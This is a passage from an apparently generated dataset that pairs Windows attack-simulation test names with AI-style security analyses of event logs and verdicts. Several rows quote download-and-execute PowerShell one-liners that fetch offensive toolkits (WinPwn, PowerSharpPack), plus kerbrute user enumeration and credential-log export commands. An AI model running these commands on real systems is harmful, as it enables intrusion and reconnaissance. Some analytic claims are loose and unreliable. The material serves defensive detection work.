- Verify if there is a Powershell or other similar stealthy administrative activity by enabling and reviewing PowerShell event logs for verbose logging."
Packet Capture Windows Command Prompt,"### Analysis of Windows Event Logs:

**Observations:**

1. **PowerShell Activity:**
   - The logs indicate the execution of a PowerShell script with the following command:  
     ```
     Powershell.exe & {New-Item -Type Directory ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\"" -ErrorAction Ignore -Force | Out-Null
     Invoke-WebRequest -OutFile ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\wireshark_installer.exe"" https://1.eu.dl.wireshark.org/win64/Wireshark-latest-x64.exe
     Start-Process ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\wireshark_installer.exe"" /S}
     ```
   - This command is downloading and executing a file from a remote source, which can be considered suspicious, especially if not authorized or expected in this environment.

2. **Process Execution Details:**
   - Multiple instances of processes like `conhost.exe` and `wevtutil.exe` are initiated, which align with normal operational behavior when interacting with command line or system utilities, often accompanying other applications.
   - The presence of `hostname.exe`, `whoami.exe`, and `cmd.exe` processes signify actions being taken to gather system and user information or execute command-line instructions.

3. **Installation of Software (Wireshark):**
   - A file, `wireshark_installer.exe`, is downloaded and executed silently (`/S` for silent installation). The download source and execution method without explicit user consent could indicate an unwanted or unauthorized software installation.
   - Following the installer execution, the Microsoft Visual C++ 2015-2022 Redistributable (`vc_redist.x64.exe`) is also being installed, which is standard for certain applications but executed immediately after the Wireshark installer, reinforcing suspicious origin points.

4. **Potential Risks:**
   - The use of PowerShell to download and install software from a potentially external, unverified site is red-flagged in security practices.
   - The absence of additional security and application logs prevents verifying if this installation was part of a routine update or deployment.

### Threat Assessment:

**SUSPICIOUS**: The event logs suggest activities that, while potentially benign in a context of administrative tasks or authorized software installation, are concerning due to the silent download and execution of applications via PowerShell, especially from a remote source without clear authorization context. 

### Guidance moving forward:

1. **Immediate Verification**: Confirm with system administrators or IT operations if this activity aligns with authorized software installations, possibly as part of routine updates or deployment tasks.
   
2. **Quarantine and Review**: Temporarily restrict the system’s network access to prevent further potential compromise while continuing to review additional logs (firewall, antivirus) or behavioral analytics for corroborative evidence of compromise or benign activity.
   
3. **Security Enhancements**: Implement stricter monitoring policies on PowerShell and direct downloads or installations from remote URLs. Encourage usage of tools that can detect unauthorized execution of scripts or installations in real-time.

4. **Incident Response Preparedness**: Prepare for incident response if discussions with IT staff indicate the installation was not authorized, as this potentially represents threat actor behavior utilizing common tools for lateral movement or reconnaissance."
WinPwn - PowerSharpPack - Seatbelt,"### Analysis of Provided Logs

Upon a detailed examination of the logs from the different Windows event sources, a few key activities stand out that closely align with indicators of potential malicious activity. Here are the observations:

#### Security Logs:
- The Security logs contain event entries related to the system's time change notifications (`EventID 4616`). While these events are typically routine and seen in standard operations, frequent or unexpected time changes can sometimes indicate malicious intent, especially coupled with subprocess control or privilege escalation techniques.

#### Windows PowerShell Logs:
- **Critical Observation:** The PowerShell logs contain multiple `EventID 600` entries that reflect the execution of potentially malicious PowerShell command:
  ```
  HostApplication=powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')}
  ```
  - The use of `iex (Invoke-Expression)` with `new-object net.webclient` to download and execute a script from an external URL is a strong indicator of malicious activity. This approach is commonly used in various attacks including file-less malware and remote exploitation attempts.
  
#### Application Logs:
- Routine updates and status change notifications regarding Windows Defender remain benign, suggesting that there might have not been an immediate detection of malicious activity on the system itself.

#### System Logs:
- The system logs do not provide further immediate evidence of anomalous behavior as they primarily document routine kernel and time services activities.

#### Sysmon Logs:
- **Critical Observation:** The Sysmon logs reflect process creation and control activities. What's particularly noteworthy is the presence of the PowerShell process:
  ```
  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  ```
  - This process is associated with the execution traced in the PowerShell logs and suggests that the executing user had high integrity/potential administrative privileges (`IntegrityLevel: High`), which increases the risk level of this incident. The parent process is `wsmprovhost.exe` running with high integrity level — a legitimate process that can be abused to run arbitrary commands.
  
### Assessment and Resolution

Given the detailed analysis of the logs and the observed behavior, the use of potentially malicious PowerShell commands is an alarming indicator of **MALICIOUS** activity. Specifically, downloading code from an untrusted source and executing it directly in the context of the PowerShell process is commonly associated with cyber threats and intrusions. This circumvents traditional file-based detection methods, increasing the stealth of the operation.

### Guidance on How to Proceed

1. **Immediate Containment and Eradication:**
   - Isolate the affected system (`Server002`) from the network to prevent any potential lateral movement.
   - Terminate suspicious processes, specifically any running instances of PowerShell executing unverified scripts.

2. **Investigation and Remediation:**
   - Conduct a thorough audit of the system to identify and remove any other indicators of compromise or persistence mechanisms that might have been established.
   - Review user activities to establish how the execution occurred — potentially involving compromised credentials.

3. **Incident Reporting and Documentation:**
   - Document all findings and steps taken for incident response for further analysis and future reference.
   - Report the incident to your cybersecurity team and follow necessary protocols for incident handling.

4. **Prevention Measures:**
   - Implement endpoint protection measures and enhance PowerShell logging and script policy enforcement (e.g., setting `ExecutionPolicy` to AllSigned).
   - Regularly update and patch systems and ensure that all defensive mechanisms are up-to-date.

The resolution for these logs is **MALICIOUS**, warranting immediate action to mitigate any further risk or compromise to the system or broader network infrastructure."
DNS Server Discovery Using nslookup,"Upon reviewing the provided Windows event logs, we can summarize the observed activities as follows:

1. **Windows Update Process**:
   - The System log indicates a typical Windows Update activity, involving the update of Microsoft Defender Antivirus (Event IDs 44 and 43). These actions correspond to regular update checks and installations.

2. **Sysmon Log Observations**:
   - Several legitimate Windows processes have been observed. These include `whoami.exe` (used for querying user information), `conhost.exe` (Console Window Host), and `wevtutil.exe` (used for working with event logs).
   - `cmd.exe` is executed with a command related to `nslookup` for querying DNS information (`_ldap._tcp.dc._msdcs.%USERDNSDOMAIN%`), which is typically related to querying Active Directory domain information but could also indicate script-based actions or reconnaissance.
   - The sequence of events involving the `wsmprovhost.exe` as the parent process is noticed, which typically indicates the WinRM provider host, possibly indicating legitimate administrative or scripted tasks.
   - The execution of `MusNotification.exe` and `wuauclt.exe`, along with `AM_Delta.exe`, appears to be part of the Windows Update and Defender update processes.

3. **Patterns and Considerations**:
   - Many executions appear to be part of routine system checks and updates, especially since they encompass processes related to system and application updates, and antivirus definitions.
   - The high frequency and sequence of standard tools like `whoami`, `nslookup`, and `cmd` might be typical of automated tasks or scripts in administrative environments.

Based on the available logs:

- **Unusual Process Execution**:
  - No explicit indicators of anomaly or unauthorized process execution are detected except for potential bulk script-like command usages, which by themselves do not confirm malicious intent.

- **Command Arguments and Execution Context**:
  - The command-line use of `nslookup` via `cmd.exe` may warrant further inspection in a broader investigation context. This activity can often serve system checks or indicate reconnaissance if originating from unauthorized contexts but appears neutral in this snapshot.

Considering the above observations, the overall activities can be categorized as:

- **Resolution: SUSPICIOUS**

The rationale for this categorization is due to the presence of high-frequency, command-line operations (especially with `nslookup`) that, while potentially administrative, require more context or correlation with other security measures to ascertain intent (e.g., cross-referencing with network logs or user activity). Further investigation should be directed to any correlating suspicious user or network activity around the same timeframe."
Examine local password policy - Windows,"In reviewing the provided Windows event logs, the analysis focuses on identifying any anomalies or indicators of potential malicious activities. Here's a detailed analysis:

### Key Observations:
1. **Frequent Use of SysInternals Tools:** There are multiple instances of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `net.exe`, `net1.exe`, and `whoami.exe` being executed by the user `SERVER002\admin_test`. While these are legitimate Windows tools, they are often used in system administration and can be exploited for malicious purposes, such as gathering system information or manipulating system settings.

2. **Execution Context and Privileges:** The processes are executed under the `High` integrity level, which implies they have elevated privileges. The use of `cmd.exe` and networking commands like `net accounts` may suggest attempts to manipulate or enumerate account settings, which could indicate malicious intent.

3. **EdgeUpdate Activity:** There is extensive activity related to `MicrosoftEdgeUpdate.exe`. While it seems legitimate as a process for updating Microsoft Edge, the volume of events and their overlap with administrative tool usage doesn't inherently raise red flags but warrants correlation with legitimate updates.

4. **Benign Processes:** The execution of standard Windows processes like `sppsvc.exe`, `WmiPrvSE.exe`, `TrustedInstaller.exe`, etc., appear to be benign and are regularly seen in Windows system operations.

### Assessment:
- **Suspicious Activity:** The usage pattern of `wevtutil.exe`, `cmd.exe`, `net.exe`, and similar processes under an administrative user context can be potentially suspicious when seen collectively. These tools are commonly used during post-exploitation activities on compromised systems.

- **Benign EdgeUpdate:** The Microsoft Edge updater's activity is expected during normal update operations. However, if combined with other suspicious activities, it's worth verifying that no unauthorized updates or system changes are being applied.

### Resolution:
Given the combination of legitimate tools being used in a way that could potentially be harmful, but without definitive evidence of compromise, the situation requires further investigation for any maliciously intended use thereof.

- **Recommendation:** **SUSPICIOUS** - Further investigation is necessary to verify if these activities are authorized administrative tasks or indicative of unauthorized post-exploitation activities. Investigating any user actions or scripts that might have executed these processes would be prudent. Additionally, correlating these logs with network activity could provide more insights."
WinPwn - GPOAudit,"Upon examining the provided Windows event logs, several findings indicate potential malicious activities that warrant further investigation:

1. **PowerShell Logs:**
   - The PowerShell logs indicate the use of a command that includes downloading and executing a PowerShell script directly from a GitHub URL. The command:
     ```powershell
     $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
     GPOAudit -noninteractive -consoleoutput
     ```
   - This method of downloading and executing scripts from the internet, especially from non-verified or non-official repositories, is a common tactic used in malicious activities. The script repository ""S3cur3Th1sSh1t"" is not known as a standard or enterprise-level PowerShell module provider.

2. **Sysmon Logs:**
   - The Sysmon logs show a sequence of processes executing around the same time, notably involving PowerShell (`powershell.exe`). The execution context appears as ""High"" for integrity level, which suggests administrative privileges. The processes appear to be triggered by the same user, ""SERVER002\\admin_test,"" which could be indicative of lateral movement or privilege escalation.
   - There are various ""conhost.exe"" and ""wevtutil.exe"" processes, which often interact with the Windows event logs and console applications, accompanying the main suspicious activities with PowerShell, hinting at potential attempts to cover tracks or manipulate logs.

3. **Security and Application Logs:**
   - The logs from Windows Defender and the Security Center indicate a regular operation with no explicit mentions of malware detected at that instance. However, specific monitoring for malicious use of PowerShell scripts might not have triggered Defender alarms if the threat landscape is evolving faster than current signatures.
   - Windows services running under SYSTEM appear typical, with tasks related to Windows updates and internal servicing processes as seen by the activity of ""TiWorker.exe"" and ""TrustedInstaller.exe.""

**Assessment:**

The logs clearly highlight activities that include downloading and executing scripts from an untrusted third-party source using PowerShell, which is a known vector for malware distribution and compromise. Given the observed behaviors, the activity can be considered suspicious, and this system might be compromised or used to execute unauthorized actions.

**Resolution:**

- **SUSPICIOUS**: The activity observed is suspicious due to the nature of the PowerShell script execution from a non-standard repository. It requires further investigation to ascertain if this was a sanctioned IT operation or unauthorized activity.

**Guidance:**

- **Immediate Actions:**
   - Isolate the host (Server002) from the network to prevent further potential damage or lateral movement.
   - Initiate a thorough forensic analysis on Server002. Include examining the PowerShell execution policy, script contents, and files in the local and system directories modified around this time.
   - Check user accounts and permissions, particularly the ""admin_test"" account, for any unauthorized access or privilege escalation.

- **Long-term Measures:**
   - Implement policies to restrict running PowerShell scripts from unauthorized sources.
   - Enhance monitoring for similar suspicious activities in PowerShell logs across the network.
   - Review and strengthen endpoint detection and response capabilities focusing on script-based threats."
WinPwn - DotNet,"Upon examining the provided Windows event logs, several key events suggest potentially suspicious or malicious activity:

### Windows PowerShell Logs:
- The PowerShell events consistently show the execution of a command that downloads and runs a script from a known GitHub repository `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...`. The use of `iex(new-object net.webclient).downloadstring(...)` is a recognized pattern for executing scripts directly from the internet. This is a common tactic used by attackers to execute remote scripts stealthily.

### Security Logs:
- Event ID 4672 indicates that a special privileges logon session occurred for the user `admin_test`, which includes powerful privileges such as `SeDebugPrivilege`. This level of access requires scrutiny, especially if aligned with suspicious activities such as the ones pointed out in the PowerShell logs.
- There is evidence of NTLM logon (Event ID 4624) from a machine named `DESKTOP-3HL5B2P`. NTLM logons, especially with administrative accounts, over the network are often scrutinized for their potential for malicious use due to vulnerabilities like Pass-the-Hash.

### System Logs:
- No overtly suspicious activity was found, but the logs are limited, focusing primarily on time-related settings.

### Application Logs:
- Logs indicate regular updates and checks by the Edge Update service, but no clear signs of compromise within these entries.

### Sysmon Logs:
- The execution of `PowerShell.exe` with suspicious command lines aligns directly back to potential malicious activities, correlating with the PowerShell logs.
- Frequent use of `wevtutil.exe` performed by `admin_test` is noted. While this utility is used for managing Windows event logs, its use should be investigated because it can be leveraged to tamper with logs.
- Consistently, many processes show high integrity levels, and combined with the invoked privileges (Security Logs), this indicates potential for system-level changes by an actor.

## Assessment:
The behavior captured in these logs, particularly the use of PowerShell to invoke scripts from a potentially malicious source, combined with escalated privileges and PowerShell execution activities, are strong indicators of a malicious compromise.

## Resolution:
- **MALICIOUS** - The logs contain activity indicative of a potential compromise, particularly pointing towards the execution of remote scripts through PowerShell and the use of elevated privileges.

## Guidance:
- Immediately isolate the affected system `Server002` to prevent any potential lateral movement.
- Investigate the user account `admin_test` for any unauthorized access or compromised credentials.
- Carry out a comprehensive forensic examination of `Server002`, focusing on artifacts related to the executed PowerShell script.
- Review network logs for additional unauthorized access or communication with external hosts.
- Assess and apply necessary security measures, such as enabling logging, auditing, and enhancing PowerShell execution policies.
"
Process Discovery - get-wmiObject,"After analyzing the provided logs from the Windows machine, I've identified several areas of interest that warrant attention:

1. **Time Manipulation Event**:
   - The Security log shows Event ID 4616 related to time changes on the system. The ""NewTime"" is set to an earlier timestamp than the ""PreviousTime"", indicating a manual alteration or rollback of the system clock. This can be suspicious, especially if it is not a routine operation, as attackers sometimes modify system times to obfuscate their actions.

2. **Use of High Privileges**:
   - There are multiple Event ID 4672 entries in the Security log, indicating that the user ""admin_test"" was granted a range of privileges like `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc. These privileges can be used for potentially malicious activities if not properly justified and monitored.

3. **PowerShell Execution**:
   - Sysmon and Windows PowerShell logs indicate the execution of a PowerShell script or command: `powershell.exe & {get-wmiObject -class Win32_Process}`. This command queries WMI for running processes and is not inherently malicious; however, PowerShell usage should be scrutinized, especially in non-typical user activity.

4. **Process Execution**:
   - Multiple executions of system utilities (wevtutil.exe, svchost.exe, conhost.exe, whoami.exe) by SERVER002\admin_test with HIGH integrity level. Individually, these processes are not suspicious, but repeated or unusual usage might indicate investigation opportunities, especially if ""admin_test"" is not typically associated with these actions.
  
5. **Logon Sessions**:
   - Multiple Event ID 4624 entries show logons for SERVER002\admin_test using NTLM authentication. The use of NTLM, especially from external sources (workstation name indicated), can be flagged for more investigation to ensure it aligns with typical usage patterns and policies within the organization.

**Assessment**:
- The log entries provide a mixture of routine system operations and potentially suspicious activities, particularly related to time changes and high privileges.
  
**Threat or Risk Identified**:
- The time rollback and high privilege usage by ""admin_test"" are the most concerning indicators. While this may be normal for administrative tasks, without further context, these activities could also facilitate or indicate malicious actions.

**Guidance**:
1. **Verify Time Changes**: Confirm if the time changes were deliberate and aligned with maintenance or incident activities. Investigate if there's any evidence of system tampering.
2. **Review 'admin_test' Activity**: Ensure the actions of this user align with their role and intended system interactions. Double-check for any abnormal patterns or behaviors during the log’s timeframe.
3. **PowerShell Execution**: Maintain scrutiny over PowerShell commands, especially those querying WMI which could symbolize information gathering.
4. **Network and Endpoint Monitoring**: Ensure logs and network traffic correlate to known and expected behavior to detect any deviations implying credential misuse or unauthorized access.

**Resolution**: **SUSPICIOUS**

Further investigation is required to affirm the legitimacy and intent of the activities, primarily focusing on the context of time changes and the purpose of the admin's privileged actions."
System Network Connections Discovery,"Based on the provided Windows event logs, let's analyze the data to determine if there are any indicators of malicious activity:

### Key Observations:

1. **Use of whoami, hostname, and cmd utilities**:
   - The use of `whoami.exe` and `hostname.exe` is observed several times. These are legitimate Windows utilities that display user and host information, which could be used by both legitimate users and attackers trying to analyze the environment.
   - `cmd.exe` is invoked with commands like `netstat`, `net use`, and `net sessions`. These commands are often used for monitoring network connections and active sessions, which could indicate reconnaissance activity if not performed as part of normal operations.

2. **Use of Wevtutil**:
   - `wevtutil.exe` is used multiple times. This tool is used for managing event logs. Frequent use of wevtutil without clear justification might be suspicious, as attackers often try to clear or alter event logs to hide their actions.

3. **NTLM Authentication Logs**:
   - There are logs indicating NTLM authentication with logon types suggesting remote logins (Logon Type 3). This method is widely used and not inherently suspicious, but coupled with other findings could raise concerns.

4. **Elevated Privileges**:
   - `SeDebugPrivilege`, among other high-privilege tokens, was granted to the user `admin_test`. This could indicate attempts to gain higher privileges or access sensitive areas of the system.

5. **Edge Update Operations**:
   - The logs show Microsoft Edge being updated, which involves expected installer operations. However, this activity appears routine and is performed by Microsoft's own update systems.

6. **Built-in and Maintenance Processes**:
   - TrustedInstaller and other system processes such as `TiWorker` are observed. These are system maintenance processes and usually benign unless manipulated by an attacker.

7. **Sparse PowerShell Logs**:
   - No PowerShell activities are detected in the logs, which might seem irregular given its common use in both administrations and attack scenarios.

### Assessment of Events:

The observed behaviors can mostly be categorized as administrative or benign activities. However, there are elements such as the repeated network commands and use of wevtutil, combined with elevation privileges, that could raise suspicions if they deviate from the normal behavior for this user or system.

### Conclusion:

- **Resolution:** SUSPICIOUS

### Guidance:

1. **Further Investigation:**
   - **User Activity**: Verify whether `admin_test` had a legitimate reason to perform network reconnaissance and event log operations.
   - **Log History**: Check for any past activities from this user or on this host that match this pattern to determine if this is part of normal operations.
   - **Event Log Integrity**: See if any event logs have been altered or cleared recently.
   - **Network Connections**: Analyze historical network connections for unusual patterns that coincide with the time of these activities.

2. **Enhanced Monitoring**:
   - Increase monitoring on user `admin_test` and apply network and application monitoring to detect any deviations from normal behavior.

3. **Patch and Update Systems**:
   - Ensure all systems are patched and that only necessary privileges are assigned, particularly those involving debugging and system-level access.

These actions will help clarify whether the suspicious behaviors are indicative of malicious activity and aid in securing the system against potential threats."
WinPwn - General privesc checks,"Based on the provided logs:

### Windows PowerShell Logs:
The PowerShell logs contain multiple entries indicating the execution of a script using `powershell.exe` with the following command:
```
powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
otherchecks -noninteractive -consoleoutput}
```
This command downloads a PowerShell script from GitHub and executes it. The nature of this script (`WinPwn.ps1`) suggests it is likely part of a penetration testing toolkit or exploitation framework. The use of `iex` (Invoke-Expression) with network download commands is a common pattern in malicious activities where scripts are fetched and executed from remote locations.

### Sysmon Logs:
- Several processes were executed in rapid succession, including `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. While the presence of frequently used Windows utilities such as `hostname.exe` and `whoami.exe` might be benign in isolation, when combined with the PowerShell execution, it could signify a reconnaissance operation or exploration by an intruder.
- The PowerShell entry in the Sysmon logs corroborates the PowerShell event showing execution of the GitHub script.
- All activities seem to be conducted under the user `SERVER002\admin_test`, which might suggest either deliberate testing by an administrator or potential misuse of an administrative account.

### Application Logs:
- The logs show typical events related to Windows Defender being on and Microsoft Edge updates. However, there are no direct indications of malicious actions within the logs, aside from the aforementioned PowerShell activity.

### Security and System Logs:
- These logs primarily record the time adjustments and system process executions which do not directly indicate any malicious activity by themselves.

### Assessment:
The use of PowerShell to download and execute a script from the internet is a strong indicator of potentially malicious activity. The script `WinPwn.ps1` appears to be related to system exploitation and penetration testing. While this could be part of legitimate security testing by an IT or security team, it could also indicate unauthorized access or compromise.

### Resolution:
**MALICIOUS** - The download and execution of a script via PowerShell from an external source like GitHub using `Invoke-Expression` coupled with the rapid execution of system utilities are definitive indicators of potential compromise. Immediate action is recommended.

### Guidance:
1. **Contain & Eradicate**: Disconnect the affected machine from the network to prevent further potential activity.
2. **Investigate Further**: Determine whether this was an authorized penetration test. If unauthorized, identify the origin of the script execution and investigate other machines for similar activity.
3. **Remediation**: If unauthorized, reset credentials for any compromised accounts, apply security patches, and review security policies to restrict the execution of such scripts.
4. **Monitor**: Enable enhanced logging and monitoring on systems to detect similar activities in the future."
Adfind - Enumerate Active Directory User Objects,"Upon analysis of the provided Windows event logs across various channels (Application, Sysmon, and Security logs), the following observations have been made, taking into account potential signs of malicious activity:

### Observations:
1. **Application Logs:**
   - Primarily contain events related to routine activities, such as Microsoft's Software Protection Service, Windows Defender status updates, and Edge updates. The status of Windows Defender was consistently ""SECURITY_PRODUCT_STATE_ON,"" indicating it was active.

2. **Sysmon Logs:**
   - Series of process creation events for a user identified as `SERVER002\admin_test`. The processes executed include PowerShell, cmd.exe, and other utilities like `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe`. 
   - The execution of `cmd.exe` with suspicious command-line arguments referring to `AdFind.exe`, a known tool often used for Active Directory reconnaissance, raises suspicion. The command execution implies enumeration of user objects through LDAP queries.
   - Consistent executions of `MicrosoftEdgeUpdate.exe` and related update processes indicate potential software update activities, although the presence in temporary directories (e.g., `C:\Program Files (x86)\Microsoft\Temp`) is somewhat uncommon in standard operations.

3. **Security Logs:**
   - Contain events associated with typical logon activities utilizing NT AUTHORITY\SYSTEM. Event IDs 4624 (successful logon) and 4672 (special privileges assigned) seem to be part of usual system activities where elevated privileges are tied to the SYSTEM account.

### Resultant Analysis:
- The use of AdFind.exe via `cmd.exe` was executed by the `admin_test` account. This behavior is typically indicative of lateral movement or reconnaissance activity within a network. This suggests that there could be an unauthorized internal enumeration of the network or user accounts taking place.
- The frequent execution of system utilities and scripts by an administrative user may also imply scripted or manually executed activities for automated tasks or system enumeration, although these could also be attributed to legitimate administrative tasks depending on the context.
- Repeated launching and stopping of update services related to Microsoft Edge appear routine but warrant further checks to verify against potentially altered broadcasting of binaries (despite being signed and from Microsoft's directory paths).

### Conclusion:
Based on the event details notably regarding the execution of AdFind.exe, this situation should be categorized as **SUSPICIOUS**. The activity patterns and tools used are often associated with reconnaissance and require further investigation to rule out any potential breach or misuse of administrative privileges.

### Guidance:
- Conduct further investigation specifically oriented towards actions by the admin_test user.
- Verify if `AdFind.exe` is sanctioned within your environment and check for any unauthorized process spawning it.
- Perform a review of recent administrative activities and contextual user actions to determine if there is a business necessity or if there is a misuse.
- Recommend reviewing network traffic logs if possible to identify any offsite communication for the tool's results.
- Enhance monitoring for this and similar enumeration tools to catch any further reconnaissance attempts."
Wevtutil - Discover NTLM Users Remote,"Upon reviewing the Windows event logs from the provided data, several entries raise concern about potentially suspicious activity. Let’s analyze the logs in detail:

### Windows PowerShell Logs:
The PowerShell event logs indicate a script execution that involves network credentials lookup and exporting event logs, specifically event ID 4776, which relates to credential validation.

- **Command Execution**: `powershell.exe` executing a script that involves `wmic.exe` to remotely interact with `$IpAddress` and using `wevtutil` to export logs containing specific security events (EventID=4776) to `C:\\ntlmusers.evtx`. This log file involves NTLM authentication events, which are sensitive as they relate to credential attempts.

### Sysmon Logs:
In the Sysmon logs, we see repeated instances of PowerShell and WMI commands, which are often used by attackers for lateral movement and information gathering:
- **Process Creation**: Execution of `wmic.exe` from a PowerShell script/process is unusual and often associated with lateral movement attempts or data exfiltration.
- The command executed by `wmic.exe` here is consistent with attempts to gather and export sensitive log data.
- **Multiple Wevtutil Executions**: Multiple invocations of `wevtutil.exe` suggest attempts to clear or export event logs—common tactics used to hide malicious activity.

### Other Logs:
- **System and Security Logs**: Minimal concerning activity – mostly time zone and service adjustments, except for the back-and-forth time change which might suggest an attempt to confuse time-based investigations.

- **Application Logs**: Routine updates and service stops related to Microsoft Edge updates, which do not reveal any immediate threats or anomalies.

### Conclusion:
The consistent use of PowerShell scripts with WMI interactions and `wevtutil` for exporting specific security logs, in combination with potentially network operations for credential validation events, aligns with tactics often used in cyber intrusions for reconnaissance and preparing further operations such as lateral movement or privilege escalation.

Given the activity detailed in these logs:

- **Resolution**: **MALICIOUS**

### Protocol:
1. **Immediate Response**:
   - Isolate the machine from the network to prevent potential spread or further data exfiltration.
   - Notify the incident response team to begin an in-depth analysis and forensic investigation.

2. **Further Investigation**:
   - Review network logs and any relevant system logs to further trace unauthorized accesses or data egress.
   - Analyze raw PowerShell scripts and WMI commands to understand full intent and scope.

3. **Mitigation**:
   - Update and strengthen monitoring rules for PowerShell and WMI execution.
   - Review and reinforce access controls, particularly focusing on credentials and permissions.

This response combines the suspicious scripts and command usage with potential threats inherent in these actions, indicating a more serious breach likely aimed at credential harvesting or data collection."
List Mozilla Firefox bookmarks on Windows with command prompt,"After carefully analyzing the provided Windows event logs, here is a detailed assessment of the situation:

1. **Suspicious Behavior and Potential Indicators:**

   - **Use of Built-in Tools:**
     - There are several instances of built-in Windows tools like `whoami.exe`, `hostname.exe`, and `cmd.exe`, which are commonly used in administrative activities but can also be used by attackers for enumeration and reconnaissance. 
     
     - The command `cmd.exe /c where /R C:\Users\ places.sqlite` executed by the user `SERVER002\admin_test` can be indicative of searching for specific database files potentially used for information gathering.

   - **Process and Parent-Child Relationships:**
     - Sysmon logs display a regular Windows administrative user's actions, with common utilities like `conhost.exe`, and `svchost.exe` seen as parent processes for several Windows processes. There is no evidence of privilege escalation attempts beyond what is typical for system processes.
   
   - **Privilege and Logon Events:**
     - Security log entries show common privilege assignments like `SeDebugPrivilege` and others during service logins, which although powerful, are standard for system processes and services and do not necessarily indicate malicious activity by themselves.
   
   - **Edge Updates:**
     - Numerous logs related to `MicrosoftEdgeUpdate.exe` are noted, showing update checks and executions. The presence of temporary files and repeated entries related to Edge update processes is consistent with regular update activities.

   - **Credential and Account Access:**
     - The security log contains EventID 4798, which indicates LDAP query to list account members of local groups. This could be suspicious if not corroborated with legitimate administrative tasks.

2. **Assessment:**
   - The logs exhibit some activities that align with normal administrative usage, particularly concerning the frequent use of system utilities and Edge update processes.
   - The usage of enumeration tools such as `whoami.exe` and `cmd.exe` searching for specific files might typically raise flags depending on the context of the administrative tasks performed by the user `admin_test`. However, there's no direct evidence pointing towards unauthorized access or data compromise.
   - Repeated entries for certain system-level updates and processes could suggest automated or expected software maintenance activities.

3. **Resolution:**
   - **SUSPICIOUS**: The identified activities are slightly more consistent with benign system usage patterns, though the enumeration processes and their contexts warrant further review to rule out any illicit reconnaissance or potential insider threat. Additional investigation should focus on validating the legitimacy of the administrative tasks being performed and correlating them with expected behaviors or administrative patterns on the host.

**Guidance on How to Proceed:**
- **Review User Activities:** Validate the activities performed by `admin_test`, especially with respect to process execution and file search activities, to confirm whether these align with expected roles and responsibilities.
- **Corroborate with Network Logs:** Analyze network-based logs or monitoring systems to confirm no anomalous data flows or unauthorized access correlating with the suspicious activities.
- **Consult Installed Software Logs:** Review application logs for recent installations or updates for software (e.g., Microsoft Edge) to confirm legitimacy and rule out any tampering.
- **Ensure Adequate Monitoring:** Set up enhanced monitoring on the processes and users identified in the logs to capture and alert on any further suspicious activity."
Kerbrute - userenum,"In analyzing the provided Windows event logs, the following observations and assessments are made:

### Suspicious or Malicious Activities:
1. **PowerShell Command Execution**: There is a PowerShell command being executed that involves `kerbrute.exe`, which is used for Kerberos brute forcing. The command-line arguments suggest enumeration of usernames in the Active Directory (`userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain`). This activity is very suspicious and suggestive of a reconnaissance attempt or an early stage of an attack, such as penetration testing or a precursor to a lateral movement attempt.
   
   - **PowerShell Log Entry Identifiers**: EventIDs 1091 to 1098 in the PowerShell logs indicate this command is being run.

2. **Process Execution Patterns**: The system has multiple entries that indicate the opening of various executables like `conhost.exe`, `wevtutil.exe`, and `svchost.exe` under the same user context `SERVER002\admin_test`. While normally these may indicate benign administrative activities, the rapid sequence and interspersing of these processes can coincide with potentially malicious scripts or activities if not aligned with expected behavior.
   
3. **Security Privileges**: There are logs showing events with privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeRestorePrivilege` (EventID 4672), which are indicative of high potential for misuse if obtained by unauthorized users. However, this in itself is contextual; it could be routine for certain administrative accounts.

4. **Logon Type**: There is an EventID 4624 indicating a logon of type 5, which is a service-type login. This in isolation seems benign but should be correlated with other events for specific timing or anomalous usage.

### Conclusion:
The activities surrounding the execution of `powershell.exe` with `kerbrute.exe` along with the context and absence of explanation for such tools being used in an administrative manner suggests that this could likely be a malicious activity (either attack or penetration testing not properly communicated). 

### Resolution:
Based on the logs provided and the potentially severe nature of the tool usage without a clear business justification, the resolution would be marked as:
- **MALICIOUS**

### Recommended Guidance:
- **Immediate Investigation**: Conduct a thorough review of the server state at the time of these events including user activity, recent network activity, and any additional context such as email or communications about any penetration testing that might excuse these activities.
- **Containment and Isolation**: If the account `admin_test` is found to be compromised or suspect, initiate account containment procedures.
- **Incident Response Activation**: Initiate further network monitoring and involve incident response to understand the potential scope and entry vector of the malicious activity.
- **Review Policies**: Assess policies on PowerShell execution and privileges usage, ensuring appropriate logging and monitoring are in place to detect similar activities in future."
WinPwn - bluekeep,"After analyzing the provided logs from the Windows host, various entries reveal suspicious and potentially malicious activities, particularly concerning the execution of PowerShell scripts and privilege escalations. Here's a breakdown of notable findings:

### Indicators of Malicious Activity

1. **Time Manipulation**:
   - Multiple `EventID 4616` entries show that the system time was manipulated (`PreviousTime` to `NewTime` adjustments). This can be a sign of attackers trying to evade time-based security mechanisms or logs.

2. **Unauthorized Privilege Usage**:
   - `EventID 4672` shows the `admin_test` account gaining a significant number of privileges: `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, etc., which suggests an escalation or misuse of privileges often associated with attack tactics.

3. **Suspicious PowerShell Activity**:
